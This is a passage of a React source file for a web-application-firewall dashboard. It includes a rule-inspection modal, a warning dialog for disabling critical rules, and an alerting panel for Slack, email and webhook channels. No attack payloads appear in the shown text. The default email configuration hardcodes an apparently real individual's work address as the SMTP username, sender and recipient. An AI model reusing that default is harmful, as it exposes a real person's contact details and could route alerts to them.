                    <span>Inspect Rule ID: {selectedRule.id}</span>
                  </div>
                  <button className="modal-close-btn" onClick={() => setSelectedRule(null)}>
                    <X size={18} />
                  </button>
                </div>

                <div style={{ padding: '24px', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div>
                    <h3 style={{ margin: '0 0 8px', color: '#f4f4f5' }}>{selectedRule.name}</h3>
                    <p style={{ fontSize: '13px', color: '#a1a1aa', lineHeight: '1.5', margin: 0 }}>
                      {selectedRule.description}
                    </p>
                  </div>

                  <div className="rule-drawer-grid">
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>OWASP Category</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>{selectedRule.category}</div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Severity Level</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', display: 'flex', gap: '6px', alignItems: 'center' }}>
                        <span className={`severity-pill ${selectedRule.severity.toLowerCase()}`} style={{ display: 'inline-block' }}>{selectedRule.severity}</span>
                      </div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>CRS Paranoia Level</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>PL {selectedRule.paranoia_level}</div>
                    </div>
                    <div className="rule-meta-box">
                      <div style={{ fontSize: '11px', color: '#a1a1aa' }}>Dynamic Logs Blocks</div>
                      <div style={{ fontSize: '14px', fontWeight: 600, color: '#ef4444' }}>{selectedRule.hit_count} triggers</div>
                    </div>
                  </div>

                  {/* syntax block */}
                  <div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <Code size={14} color="#3b82f6" />
                      CyberSentinel Engine Configuration Rule Syntax
                    </div>
                    {ruleDetailLoading ? (
                      <div style={{ background: 'rgba(0,0,0,0.2)', padding: '24px', textAlign: 'center', borderRadius: '8px' }}>
                        <div className="spinner" style={{ margin: '0 auto' }}></div>
                      </div>
                    ) : detailedRule ? (
                      <pre className="syntax-box">{detailedRule.syntax}</pre>
                    ) : (
                      <pre className="syntax-box">{selectedRule.syntax}</pre>
                    )}
                  </div>

                  {/* trigger examples */}
                  <div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <Database size={14} color="#10b981" />
                      Simulated Payload / Attack Trigger Examples
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {getPayloadSample(selectedRule.category).map((sample, idx) => (
                        <div key={idx} style={{ background: 'rgba(255,255,255,0.02)', padding: '10px 14px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <code style={{ fontSize: '12px', color: '#fca5a5', fontFamily: 'monospace' }}>{sample}</code>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(sample);
                              showToast("Copied trigger payload to clipboard!");
                            }}
                            className="action-btn-inspect"
                            style={{ padding: '3px 8px', fontSize: '10px' }}
                          >
                            Copy
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* file path */}
                  <div style={{ fontSize: '11px', color: '#a1a1aa', borderTop: '1px solid var(--border-color)', paddingTop: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
                    <strong>VENDOR SOURCE:</strong> {selectedRule.file_path}
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>,
        document.body
      )}

      {/* --- Warn Override Confirmation Overlay for Disabling High/Critical Rules --- */}
      {createPortal(
        <AnimatePresence>
          {ruleToDisable && (
            <div className="modal-overlay" style={{ zIndex: 1100 }}>
              <motion.div
                className="modal-content pulse-warning"
                style={{ maxWidth: '520px', border: '1px solid rgba(239, 68, 68, 0.35)' }}
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
              >
                <div className="modal-header" style={{ background: 'rgba(239, 68, 68, 0.03)', borderBottom: '1px solid rgba(239,68,68,0.15)' }}>
                  <div className="modal-title" style={{ color: '#fca5a5' }}>
                    <AlertIcon size={20} color="#ef4444" />
                    <span>Security Protection Override Warning</span>
                  </div>
                  <button className="modal-close-btn" onClick={() => setRuleToDisable(null)}>
                    <X size={18} />
                  </button>
                </div>

                <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div className="warning-banner" style={{ margin: 0 }}>
                    <AlertTriangleIcon size={24} style={{ flexShrink: 0, marginTop: '2px' }} />
                    <div>
                      <h4 style={{ margin: '0 0 4px', fontWeight: 600 }}>Tuning Protection Override Alert</h4>
                      <p style={{ fontSize: '12px', margin: 0, lineHeight: '1.4' }}>
                        Disabling the rule <strong>{ruleToDisable.id} ({ruleToDisable.severity})</strong> degrades overall WAF security posture. This may leave application entry points vulnerable to SQL Injection, XSS, or RCE exploits.
                      </p>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '13px', fontWeight: 600, color: '#f4f4f5', display: 'block', marginBottom: '8px' }}>
                      Tuning Override Justification <span style={{ color: '#ef4444' }}>*</span>
                    </label>
                    <textarea
                      placeholder="Provide detailed white-listing reason (e.g. White-listing corporate webhook false positive on parameter x)"
                      value={disableReason}
                      onChange={(e) => {
                        setDisableReason(e.target.value);
                        if (e.target.value.trim().length >= 3) setDisableError('');
                      }}
                      style={{
                        width: '100%',
                        height: '80px',
                        background: 'rgba(0,0,0,0.2)',
                        border: '1px solid rgba(255,255,255,0.06)',
                        borderRadius: '8px',
                        padding: '10px 12px',
                        color: '#fff',
                        fontSize: '13px',
                        outline: 'none',
                        resize: 'none'
                      }}
                    />
                    {disableError && (
                      <span style={{ fontSize: '11px', color: '#ef4444', display: 'block', marginTop: '4px' }}>
                        {disableError}
                      </span>
                    )}
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
                    <button
                      onClick={() => setRuleToDisable(null)}
                      className="action-btn-inspect"
                      style={{ background: 'transparent', color: '#a1a1aa', borderColor: 'rgba(255,255,255,0.1)' }}
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleConfirmDisable}
                      className="action-btn-inspect"
                      style={{ background: '#ef4444', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
                    >
                      Confirm Override
                    </button>
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>,
        document.body
      )}

    </div>
  );
}

function AlertsIntegrations({ userRole }) {
  const [loading, setLoading] = useState(true);
  const [healthData, setHealthData] = useState(null);
  const [activeSubTab, setActiveSubTab] = useState('connectors'); // 'connectors', 'channels', 'rules'

  // Alert Config State
  const [channels, setChannels] = useState([]);
  const [rules, setRules] = useState([]);
  const [isChannelCreateOpen, setIsChannelCreateOpen] = useState(false);
  const [isRuleCreateOpen, setIsRuleCreateOpen] = useState(false);
  const [channelForm, setChannelForm] = useState({ name: '', channel_type: 'slack', config: {} });
  const [ruleForm, setRuleForm] = useState({ name: '', event_type: 'attack_detected', severity: 'high', conditions: {}, channels: [], throttle_minutes: 5 });

  const fetchHealth = async () => {
    try {
      const data = await getHealth();
      setHealthData(data);
    } catch (err) {
      console.error("Health check failed", err);
    } finally {
      setLoading(false);
    }
  };

  const loadAlertData = async () => {
    try {
      const chans = await getAlertChannels();
      setChannels(chans || []);
      const rls = await getAlertRules();
      setRules(rls || []);
    } catch (err) {
      console.error("Error loading alert configurations:", err);
    }
  };

  useEffect(() => {
    fetchHealth();
    loadAlertData();
    const interval = setInterval(fetchHealth, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleCreateChannel = async (e) => {
    e.preventDefault();
    try {
      if (channelForm.id) {
        await updateAlertChannel(channelForm.id, channelForm);
      } else {
        await createAlertChannel(channelForm);
      }
      setIsChannelCreateOpen(false);
      setChannelForm({ name: '', channel_type: 'slack', config: {} });
      loadAlertData();
    } catch (err) {
      alert("Failed to save channel: " + err.message);
    }
  };

  const handleDeleteChannel = async (id) => {
    if (window.confirm("Are you sure you want to delete this notification channel?")) {
      try {
        await deleteAlertChannel(id);
        loadAlertData();
      } catch (err) {
        alert("Failed to delete channel: " + err.message);
      }
    }
  };

  const handleTestChannel = async (id) => {
    try {
      const res = await testAlertChannel(id, { test_message: "Test warning alert configured successfully." });
      if (res.success) {
        alert("Test notification dispatched successfully!");
      } else {
        alert("Dispatch failed: " + res.message);
      }
    } catch (err) {
      alert("Error: " + err.message);
    }
  };

  const handleCreateRule = async (e) => {
    e.preventDefault();
    try {
      await createAlertRule(ruleForm);
      setIsRuleCreateOpen(false);
      setRuleForm({ name: '', event_type: 'attack_detected', severity: 'high', conditions: {}, channels: [], throttle_minutes: 5 });
      loadAlertData();
    } catch (err) {
      alert("Failed to create rule: " + err.message);
    }
  };

  const handleDeleteRule = async (id) => {
    if (window.confirm("Are you sure you want to delete this alerting rule?")) {
      try {
        await deleteAlertRule(id);
        loadAlertData();
      } catch (err) {
        alert("Failed to delete rule: " + err.message);
      }
    }
  };

  const futureIntegrations = [
    { name: 'Elasticsearch Indexer', desc: 'Forward WAF audit events directly to an Elasticsearch cluster.', icon: Database },
    { name: 'Fluent Bit Log Streamer', desc: 'Stream live CyberSentinel logs via Fluent Bit daemonsets.', icon: Code },
    { name: 'Telegram Alerts', desc: 'Send real-time alerts to Telegram SOC channels via Bot API.', icon: Server }
  ];

  if (loading && !healthData) {
    return (
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '300px', color: '#a1a1aa', gap: '12px' }}>
        <Activity className="animate-spin" size={24} color="#3b82f6" />
        <span>Loading alerting & integrations status...</span>
      </div>
    );
  }

  return (
    <motion.div
      className="integrations-container animate-fade-in"
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}
    >
      {/* Tab Selection */}
      <div style={{ display: 'flex', gap: '12px', borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '12px' }}>
        <button
          className={`tab-btn ${activeSubTab === 'connectors' ? 'active' : ''}`}
          style={{ padding: '8px 16px', fontSize: '13px', borderRadius: '6px', background: activeSubTab === 'connectors' ? 'rgba(59,130,246,0.1)' : 'transparent', border: activeSubTab === 'connectors' ? '1px solid rgba(59,130,246,0.2)' : '1px solid transparent', color: activeSubTab === 'connectors' ? '#60a5fa' : '#a1a1aa', cursor: 'pointer', transition: 'all 0.2s' }}
          onClick={() => setActiveSubTab('connectors')}
        >
          Connectors & Health
        </button>
        <button
          className={`tab-btn ${activeSubTab === 'channels' ? 'active' : ''}`}
          style={{ padding: '8px 16px', fontSize: '13px', borderRadius: '6px', background: activeSubTab === 'channels' ? 'rgba(59,130,246,0.1)' : 'transparent', border: activeSubTab === 'channels' ? '1px solid rgba(59,130,246,0.2)' : '1px solid transparent', color: activeSubTab === 'channels' ? '#60a5fa' : '#a1a1aa', cursor: 'pointer', transition: 'all 0.2s' }}
          onClick={() => setActiveSubTab('channels')}
        >
          Notification Channels ({channels.length})
        </button>
        <button
          className={`tab-btn ${activeSubTab === 'rules' ? 'active' : ''}`}
          style={{ padding: '8px 16px', fontSize: '13px', borderRadius: '6px', background: activeSubTab === 'rules' ? 'rgba(59,130,246,0.1)' : 'transparent', border: activeSubTab === 'rules' ? '1px solid rgba(59,130,246,0.2)' : '1px solid transparent', color: activeSubTab === 'rules' ? '#60a5fa' : '#a1a1aa', cursor: 'pointer', transition: 'all 0.2s' }}
          onClick={() => setActiveSubTab('rules')}
        >
          Evaluation Rules ({rules.length})
        </button>
      </div>

      {/* Connectors Tab */}
      {activeSubTab === 'connectors' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
            <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontWeight: 600, color: '#e4e4e7' }}>CyberSentinel Engine</span>
                <span className="status-badge green"><span className="status-dot"></span> Active</span>
              </div>
              <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <div><strong style={{ color: '#d4d4d8' }}>Engine:</strong> v3.0.12 (libmodsecurity)</div>
                <div><strong style={{ color: '#d4d4d8' }}>Type:</strong> Web Application Firewall</div>
                <div><strong style={{ color: '#d4d4d8' }}>Scope:</strong> Connection Filtering</div>
              </div>
            </div>

            <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontWeight: 600, color: '#e4e4e7' }}>OWASP CRS</span>
                <span className="status-badge green"><span className="status-dot"></span> Active</span>
              </div>
              <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <div><strong style={{ color: '#d4d4d8' }}>Ruleset:</strong> v4.0.0 (Core Ruleset)</div>
                <div><strong style={{ color: '#d4d4d8' }}>Active Rules:</strong> 250+ guards</div>
                <div><strong style={{ color: '#d4d4d8' }}>Paranoia Level:</strong> PL1</div>
              </div>
            </div>

            <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontWeight: 600, color: '#e4e4e7' }}>NGINX</span>
                <span className="status-badge green"><span className="status-dot"></span> Running</span>
              </div>
              <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <div><strong style={{ color: '#d4d4d8' }}>Version:</strong> nginx/1.24.0</div>
                <div><strong style={{ color: '#d4d4d8' }}>ModSec Connector:</strong> Enabled</div>
                <div><strong style={{ color: '#d4d4d8' }}>Reverse Proxy:</strong> Active</div>
              </div>
            </div>

            <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontWeight: 600, color: '#e4e4e7' }}>FastAPI Backend</span>
                <span className={`status-badge ${healthData?.status === 'ok' ? 'green' : 'red'}`}>
                  <span className="status-dot"></span> {healthData?.status === 'ok' ? 'Connected' : 'Offline'}
                </span>
              </div>
              <div style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <div><strong style={{ color: '#d4d4d8' }}>Port:</strong> 8000 (Uvicorn)</div>
                <div><strong style={{ color: '#d4d4d8' }}>Parsed Logs:</strong> {healthData?.total_parsed_files || 0} files</div>
                <div><strong style={{ color: '#d4d4d8' }}>Log Status:</strong> {healthData?.log_directory_exists ? 'Readable' : 'Unreachable'}</div>
              </div>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '16px' }}>
            <div className="glass-panel" style={{ padding: '24px' }}>
              <div style={{ fontSize: '15px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Activity size={16} color="#3b82f6" />
                <span>Internal API Gateway Probe Status</span>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.04)' }}>
                  <div style={{ display: 'flex', flexDirection: 'column' }}>
                    <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>GET /logs</span>
                    <span style={{ fontSize: '11px', color: '#a1a1aa' }}>Query transaction log streams</span>
                  </div>
                  <span style={{ fontSize: '11px', background: 'rgba(16,185,129,0.1)', color: '#10b981', border: '1px solid rgba(16,185,129,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>200 OK</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.04)' }}>
                  <div style={{ display: 'flex', flexDirection: 'column' }}>
                    <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>GET /stats</span>
                    <span style={{ fontSize: '11px', color: '#a1a1aa' }}>Calculates incident counters</span>
                  </div>
                  <span style={{ fontSize: '11px', background: 'rgba(16,185,129,0.1)', color: '#10b981', border: '1px solid rgba(16,185,129,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>200 OK</span>
                </div>
              </div>
            </div>
          </div>

          <div style={{ fontSize: '16px', fontWeight: 600, color: '#a1a1aa', display: 'flex', alignItems: 'center', gap: '8px', marginTop: '16px' }}>
            <Lock size={18} color="#a1a1aa" />
            <span>Enterprise Connectors (Future Roadmap)</span>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
            {futureIntegrations.map((item, index) => {
              const Icon = item.icon;
              return (
                <div key={index} className="glass-panel" style={{ padding: '20px', display: 'flex', gap: '16px', opacity: 0.45, position: 'relative', overflow: 'hidden' }}>
                  <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.05)', padding: '10px', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center', height: '42px', width: '42px', flexShrink: 0 }}>
                    <Icon size={20} color="#a1a1aa" />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div style={{ fontWeight: 600, color: '#e4e4e7', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <span>{item.name}</span>
                      <span style={{ fontSize: '9px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#a1a1aa', padding: '1px 5px', borderRadius: '3px', textTransform: 'uppercase' }}>Inactive</span>
                    </div>
                    <p style={{ fontSize: '12px', color: '#a1a1aa', margin: 0, lineHeight: '1.4' }}>{item.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Channels Tab */}
      {activeSubTab === 'channels' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '14px', color: '#a1a1aa' }}>Configure Slack, Email and Custom Webhook integrations:</span>
            {userRole === 'admin' && (
              <button className="action-btn-inspect" style={{ padding: '8px 16px', fontSize: '13px' }} onClick={() => setIsChannelCreateOpen(true)}>
                + Add Integration Channel
              </button>
            )}
          </div>

          {isChannelCreateOpen && (
            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', padding: '20px', borderRadius: '8px', marginBottom: '16px' }}>
              <form onSubmit={handleCreateChannel} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <h4 style={{ margin: 0, fontSize: '14px', color: '#60a5fa' }}>{channelForm.id ? 'Edit Notification Integration' : 'Add New Notification Integration'}</h4>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Connection Name</label>
                    <input className="settings-input" type="text" placeholder="e.g. SOC Team Slack" required value={channelForm.name} onChange={(e) => setChannelForm({ ...channelForm, name: e.target.value })} />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Connector Type</label>
                    <select className="settings-input" style={{ width: '100%' }} value={channelForm.channel_type} onChange={(e) => {
                      const newType = e.target.value;
                      let defaultCfg = {};
                      if (newType === 'email') defaultCfg = { smtp_host: "smtp.office365.com", smtp_port: 587, username: "darshan.butle@vginfotech.ai", password: "YOUR_PASSWORD_HERE", from_addr: "darshan.butle@vginfotech.ai", to_addrs: ["darshan.butle@vginfotech.ai"], use_tls: true, use_ssl: false };
                      else if (newType === 'slack') defaultCfg = { webhook_url: "https://hooks.slack.com/services/..." };
                      else defaultCfg = { url: "https://company.api/events", method: "POST", headers: {} };
                      setChannelForm({ ...channelForm, channel_type: newType, config: defaultCfg });
                    }}>
                      <option value="slack">Slack Webhook</option>
                      <option value="email">Email SMTP</option>
                      <option value="webhook">Generic Webhook</option>
                    </select>
                  </div>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Configuration Payload (JSON)</label>
                  <textarea 
                    key={channelForm.channel_type}
                    className="settings-input" 
                    required 
                    style={{ minHeight: '140px', fontSize: '11px', fontFamily: 'monospace' }} 
                    defaultValue={Object.keys(channelForm.config).length > 0 ? JSON.stringify(channelForm.config, null, 2) : (channelForm.channel_type === 'slack' ? '{\n  "webhook_url": "https://hooks.slack.com/services/..."\n}' : channelForm.channel_type === 'email' ? '{\n  "smtp_host": "smtp.office365.com",\n  "smtp_port": 587,\n  "username": "darshan.butle@vginfotech.ai",\n  "password": "YOUR_PASSWORD_HERE",\n  "from_addr": "darshan.butle@vginfotech.ai",\n  "to_addrs": ["darshan.butle@vginfotech.ai"],\n  "use_tls": true,\n  "use_ssl": false\n}' : '{\n  "url": "https://company.api/events",\n  "method": "POST",\n  "headers": {}\n}')} 
                    onChange={(e) => {
                      try {
                        const cfg = JSON.parse(e.target.value);
                        setChannelForm({ ...channelForm, config: cfg });
                      } catch {}
                    }}
                  ></textarea>
                </div>
                <div style={{ display: 'flex', gap: '10px', marginTop: '4px' }}>
                  <button type="submit" className="modal-btn primary" style={{ margin: 0 }}>Save Integration</button>
                  <button type="button" className="modal-btn secondary" onClick={() => { setIsChannelCreateOpen(false); setChannelForm({ name: '', channel_type: 'slack', config: {} }); }} style={{ margin: 0 }}>Cancel</button>
                </div>
              </form>
            </motion.div>
          )}

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(340px, 1fr))', gap: '16px' }}>
            {channels.length > 0 ? (
              channels.map(chan => (
                <div key={chan.id} className="glass-panel" style={{ padding: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', flex: 1, minWidth: 0, paddingRight: '16px' }}>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <span style={{ fontWeight: 700, fontSize: '14px', color: '#e4e4e7', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{chan.name}</span>
                      <span style={{ background: 'rgba(59,130,246,0.15)', color: '#60a5fa', fontSize: '9px', textTransform: 'uppercase', padding: '2px 6px', borderRadius: '4px', fontWeight: 600 }}>{chan.channel_type}</span>
                    </div>
                    <code style={{ fontSize: '11px', color: '#a1a1aa', fontFamily: 'monospace', wordBreak: 'break-all' }}>{JSON.stringify(chan.config)}</code>
                  </div>
                  <div style={{ display: 'flex', gap: '8px', flexShrink: 0 }}>
                    <button className="action-btn-inspect" style={{ padding: '6px 12px', fontSize: '11px', margin: 0 }} onClick={() => handleTestChannel(chan.id)}>Test</button>
                    {userRole === 'admin' && chan.channel_type === 'email' && (
                      <button className="action-btn-inspect" style={{ padding: '6px 12px', fontSize: '11px', margin: 0 }} onClick={() => { setChannelForm(chan); setIsChannelCreateOpen(true); }}>
                        Edit
                      </button>
                    )}
                    {userRole === 'admin' && (
                      <button className="action-btn-inspect" style={{ padding: '6px 12px', fontSize: '11px', color: '#f87171', border: '1px solid rgba(239,68,68,0.2)', background: 'rgba(239,68,68,0.06)', margin: 0 }} onClick={() => handleDeleteChannel(chan.id)}>
                        Delete
                      </button>
                    )}
                  </div>
                </div>
              ))
            ) : (
              <div className="glass-panel" style={{ gridColumn: 'span 12', padding: '30px', textAlign: 'center', color: '#a1a1aa' }}>
                No active notification integrations configured.
              </div>
            )}
          </div>
        </div>
      )}

      {/* Rules Tab */}
      {activeSubTab === 'rules' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '14px', color: '#a1a1aa' }}>Define warning and critical event alerting thresholds:</span>
            {userRole === 'admin' && (
              <button className="action-btn-inspect" style={{ padding: '8px 16px', fontSize: '13px' }} onClick={() => setIsRuleCreateOpen(true)}>
                + Create Alert Rule
              </button>
            )}
          </div>

          {isRuleCreateOpen && (
            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', padding: '20px', borderRadius: '8px', marginBottom: '16px' }}>
              <form onSubmit={handleCreateRule} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <h4 style={{ margin: 0, fontSize: '14px', color: '#60a5fa' }}>Create Incident Alerting Rule</h4>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '16px' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Rule Name</label>
                    <input className="settings-input" type="text" placeholder="e.g. Critical Threat Event" required value={ruleForm.name} onChange={(e) => setRuleForm({ ...ruleForm, name: e.target.value })} />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Event Type</label>
                    <select className="settings-input" style={{ width: '100%' }} value={ruleForm.event_type} onChange={(e) => setRuleForm({ ...ruleForm, event_type: e.target.value })}>
                      <option value="attack_detected">Attack Detected (WAF)</option>
                      <option value="high_threat_score">High Anomaly Threat Score</option>
                      <option value="ml_anomaly">ML Engine Anomaly Event</option>
                    </select>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Severity Level</label>
                    <select className="settings-input" style={{ width: '100%' }} value={ruleForm.severity} onChange={(e) => setRuleForm({ ...ruleForm, severity: e.target.value })}>
                      <option value="critical">Critical</option>
                      <option value="high">High</option>
                      <option value="medium">Medium</option>
                    </select>
                  </div>
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '16px' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Conditions JSON (Optional)</label>
                    <input className="settings-input" type="text" placeholder='e.g. {"threat_score_gt": 80}' onChange={(e) => {
                      try {
                        const conds = JSON.parse(e.target.value);
                        setRuleForm({ ...ruleForm, conditions: conds });
                      } catch {}
                    }} />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Throttle Cooldown (Minutes)</label>
                    <input className="settings-input" type="number" min="1" value={ruleForm.throttle_minutes} onChange={(e) => setRuleForm({ ...ruleForm, throttle_minutes: parseInt(e.target.value) || 5 })} />
                  </div>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '12px', color: '#a1a1aa' }}>Routing Targets (Channel IDs, comma-separated e.g. 1, 2)</label>
                  <input className="settings-input" type="text" placeholder="Enter channel numeric IDs..." onChange={(e) => {
                    const ids = e.target.value.split(',').map(x => parseInt(x.trim())).filter(x => !isNaN(x));
                    setRuleForm({ ...ruleForm, channels: ids });
                  }} />
                </div>
                <div style={{ display: 'flex', gap: '10px', marginTop: '4px' }}>
                  <button type="submit" className="modal-btn primary" style={{ margin: 0 }}>Create Rule</button>
                  <button type="button" className="modal-btn secondary" onClick={() => setIsRuleCreateOpen(false)} style={{ margin: 0 }}>Cancel</button>
                </div>
              </form>
            </motion.div>
          )}

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '16px' }}>
            {rules.length > 0 ? (
              rules.map(rule => (
                <div key={rule.id} className="glass-panel" style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '12px', position: 'relative' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontWeight: 700, fontSize: '14px', color: '#e4e4e7' }}>{rule.name}</span>
                    <span style={{
                      padding: '2px 8px', borderRadius: '4px', fontSize: '9px', fontWeight: 700, textTransform: 'uppercase',
                      background: rule.severity === 'critical' ? 'var(--danger-bg)' : 'var(--warning-bg)',
                      color: rule.severity === 'critical' ? 'var(--danger-color)' : 'var(--warning-color)',
                      border: rule.severity === 'critical' ? '1px solid rgba(255, 59, 92, 0.2)' : '1px solid rgba(255, 149, 0, 0.2)'
                    }}>{rule.severity}</span>
                  </div>
                  <div style={{ fontSize: '12px', display: 'flex', flexDirection: 'column', gap: '6px', borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: '10px', color: '#a1a1aa' }}>
